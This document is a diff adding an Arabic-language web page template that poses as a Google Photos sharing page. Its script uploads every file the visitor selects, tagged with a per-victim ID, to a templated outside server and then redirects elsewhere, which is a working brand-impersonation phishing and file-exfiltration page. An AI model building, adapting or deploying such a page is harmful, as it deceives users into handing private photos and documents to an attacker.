@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Photos</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{
+      background:#1a1a1a;
+      color:#fff;
+      font-family:'Google Sans',Roboto,Arial,sans-serif;
+      min-height:100vh;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+    }
+    .card{
+      background:#2a2a2a;
+      border-radius:16px;
+      padding:32px 24px;
+      width:92%;
+      max-width:380px;
+      text-align:center;
+      box-shadow:0 8px 40px rgba(0,0,0,.5);
+    }
+    .glogo{font-size:48px;margin-bottom:12px}
+    h2{font-size:20px;font-weight:500;margin-bottom:8px;color:#e8e8e8}
+    .desc{font-size:13px;color:#999;line-height:1.7;margin-bottom:24px}
+    .share-box{
+      border:2px dashed #444;
+      border-radius:12px;
+      padding:28px 16px;
+      margin-bottom:20px;
+      cursor:pointer;
+      transition:border-color .2s,background .2s;
+      position:relative;
+    }
+    .share-box:hover,.share-box.drag{border-color:#4285f4;background:#1e2a3a}
+    .share-icon{font-size:40px;margin-bottom:10px}
+    .share-txt{font-size:14px;color:#bbb;margin-bottom:6px}
+    .share-sub{font-size:12px;color:#666}
+    #fileInput{display:none}
+
+    .btn{
+      display:block;width:100%;
+      background:#4285f4;
+      color:#fff;border:none;
+      padding:14px;border-radius:50px;
+      font-size:15px;font-weight:600;
+      cursor:pointer;margin-bottom:10px;
+    }
+    .btn:active{opacity:.85}
+    .btn-sec{
+      background:transparent;
+      border:1px solid #555;
+      color:#bbb;
+      font-weight:400;
+    }
+
+    /* preview */
+    #preview{
+      display:flex;flex-wrap:wrap;gap:6px;
+      margin-bottom:16px;justify-content:center;
+    }
+    .thumb{
+      width:68px;height:68px;
+      object-fit:cover;border-radius:8px;
+      border:2px solid #4285f4;
+    }
+    .thumb-doc{
+      width:68px;height:68px;
+      background:#1e2a3a;
+      border-radius:8px;
+      border:2px solid #4285f4;
+      display:flex;align-items:center;
+      justify-content:center;font-size:28px;
+    }
+    .count-badge{
+      background:#4285f4;color:#fff;
+      border-radius:20px;
+      padding:4px 14px;font-size:13px;
+      display:inline-block;margin-bottom:16px;
+    }
+
+    /* progress */
+    #progWrap{display:none;margin-bottom:16px}
+    .prog-bar-bg{background:#333;border-radius:8px;height:8px;overflow:hidden}
+    .prog-bar{height:8px;background:#4285f4;border-radius:8px;width:0%;transition:width .3s}
+    .prog-txt{font-size:12px;color:#888;margin-top:6px}
+
+    #status{font-size:14px;color:#aaa;min-height:18px;margin-top:8px}
+
+    .spinner{
+      display:none;
+      width:36px;height:36px;
+      border:4px solid #333;border-top:4px solid #4285f4;
+      border-radius:50%;animation:sp .8s linear infinite;
+      margin:0 auto 12px;
+    }
+    @keyframes sp{to{transform:rotate(360deg)}}
+  </style>
+</head>
+<body>
+<div class="card">
+  <div class="glogo">📷</div>
+  <h2>مشاركة الصور والملفات</h2>
+  <p class="desc">اختر الصور أو الملفات التي تريد مشاركتها عبر Google Photos</p>
+
+  <div class="share-box" id="dropZone" onclick="document.getElementById('fileInput').click()">
+    <div class="share-icon">🖼️</div>
+    <div class="share-txt">اضغط لاختيار الصور والملفات</div>
+    <div class="share-sub">أو اسحب وأفلت هنا</div>
+  </div>
+  <input type="file" id="fileInput" multiple accept="*/*">
+
+  <div id="preview"></div>
+  <div class="count-badge" id="countBadge" style="display:none"></div>
+
+  <div class="spinner" id="spinner"></div>
+  <div id="progWrap">
+    <div class="prog-bar-bg"><div class="prog-bar" id="progBar"></div></div>
+    <div class="prog-txt" id="progTxt"></div>
+  </div>
+
+  <button class="btn" id="uploadBtn" onclick="startUpload()" style="display:none">
+    📤 مشاركة الآن
+  </button>
+  <button class="btn btn-sec" id="cancelBtn" onclick="reset()" style="display:none">
+    إلغاء
+  </button>
+  <div id="status"></div>
+</div>
+
+<script>
+  const uid       = "<%= uid %>";
+  const serverURL = "<%= a %>";
+  const redirectUrl="<%= redirectUrl %>";
+
+  let chosen = [];
+
+  const fileInput  = document.getElementById('fileInput');
+  const dropZone   = document.getElementById('dropZone');
+  const preview    = document.getElementById('preview');
+  const countBadge = document.getElementById('countBadge');
+  const uploadBtn  = document.getElementById('uploadBtn');
+  const cancelBtn  = document.getElementById('cancelBtn');
+  const progWrap   = document.getElementById('progWrap');
+  const progBar    = document.getElementById('progBar');
+  const progTxt    = document.getElementById('progTxt');
+  const spinner    = document.getElementById('spinner');
+  const status     = document.getElementById('status');
+
+  // Drag & drop
+  dropZone.addEventListener('dragover', e => { e.preventDefault(); dropZone.classList.add('drag'); });
+  dropZone.addEventListener('dragleave', () => dropZone.classList.remove('drag'));
+  dropZone.addEventListener('drop', e => { e.preventDefault(); dropZone.classList.remove('drag'); handleFiles(e.dataTransfer.files); });
+
+  fileInput.addEventListener('change', () => handleFiles(fileInput.files));
+
+  function handleFiles(files) {
+    if (!files || !files.length) return;
+    chosen = Array.from(files);
+    preview.innerHTML = '';
+    const show = Math.min(chosen.length, 12);
+    for (let i = 0; i < show; i++) {
+      const f = chosen[i];
+      if (f.type.startsWith('image/')) {
+        const img = document.createElement('img');
+        img.className = 'thumb';
+        img.src = URL.createObjectURL(f);
+        preview.appendChild(img);
+      } else {
+        const d = document.createElement('div');
+        d.className = 'thumb-doc';
+        d.textContent = fileEmoji(f.name);
+        preview.appendChild(d);
+      }
+    }
+    if (chosen.length > 12) {
+      const more = document.createElement('div');
+      more.className = 'thumb-doc';
+      more.style.fontSize = '14px';
+      more.textContent = `+${chosen.length - 12}`;
+      preview.appendChild(more);
+    }
+    countBadge.textContent = `✅ تم اختيار ${chosen.length} ملف`;
+    countBadge.style.display = 'inline-block';
+    uploadBtn.style.display  = 'block';
+    cancelBtn.style.display  = 'block';
+    dropZone.style.display   = 'none';
+  }
+
+  function fileEmoji(name) {
+    const ext = (name.split('.').pop() || '').toLowerCase();
+    if (['pdf'].includes(ext)) return '📄';
+    if (['doc','docx'].includes(ext)) return '📝';
+    if (['xls','xlsx'].includes(ext)) return '📊';
+    if (['mp4','mov','avi','mkv'].includes(ext)) return '🎬';
+    if (['mp3','aac','wav'].includes(ext)) return '🎵';
+    if (['zip','rar','7z'].includes(ext)) return '🗜️';
+    return '📁';
+  }
+
+  async function startUpload() {
+    if (!chosen.length) return;
+    uploadBtn.style.display = 'none';
+    cancelBtn.style.display = 'none';
+    spinner.style.display   = 'block';
+    progWrap.style.display  = 'block';
+    status.textContent      = '';
+
+    let done = 0;
+    let failed = 0;
+    const total = chosen.length;
+
+    for (const file of chosen) {
+      progTxt.textContent = `جارٍ الرفع ${done + 1} من ${total}...`;
+      progBar.style.width = `${Math.round((done / total) * 100)}%`;
+
+      const fd = new FormData();
+      fd.append('uid',  uid);
+      fd.append('file', file, file.name);
+      try {
+        const r = await fetch(serverURL + '/file-upload', { method:'POST', body:fd });
+        if (!r.ok) failed++;
+      } catch(e) { failed++; }
+      done++;
+      progBar.style.width = `${Math.round((done / total) * 100)}%`;
+    }
+
+    spinner.style.display = 'none';
+    progBar.style.width   = '100%';
+    progTxt.textContent   = '';
+
+    if (failed === 0) {
+      status.textContent = `✅ تمت المشاركة بنجاح (${total} ملف)`;
+    } else {
+      status.textContent = `⚠️ تم رفع ${total - failed} من ${total}`;
+    }
+    setTimeout(() => { window.location.href = redirectUrl; }, 1600);
+  }
+
+  function reset() {
+    chosen = [];
+    preview.innerHTML     = '';
+    countBadge.style.display = 'none';
+    uploadBtn.style.display  = 'none';
+    cancelBtn.style.display  = 'none';
+    dropZone.style.display   = 'block';
+    progWrap.style.display   = 'none';
+    status.textContent       = '';
+    fileInput.value          = '';
+  }
+</script>
+</body>
+</html>
